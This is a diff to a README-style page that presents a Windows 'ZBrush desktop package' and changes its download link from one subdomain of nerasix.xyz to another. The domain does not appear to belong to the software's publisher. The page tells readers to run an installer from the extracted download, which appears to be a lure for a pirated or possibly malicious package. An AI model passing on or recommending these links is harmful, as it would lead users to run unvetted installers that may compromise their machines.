@@ -8,8 +8,8 @@ ZBrush desktop package for Windows · 3d toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[zbrush.nerasix.xyz](https://zbrush.nerasix.xyz/)**
-* **Full URL:** `https://zbrush.nerasix.xyz/`
+* **Project link:** **[zbrush-max-features.nerasix.xyz](https://zbrush-max-features.nerasix.xyz/)**
+* **Full URL:** `https://zbrush-max-features.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
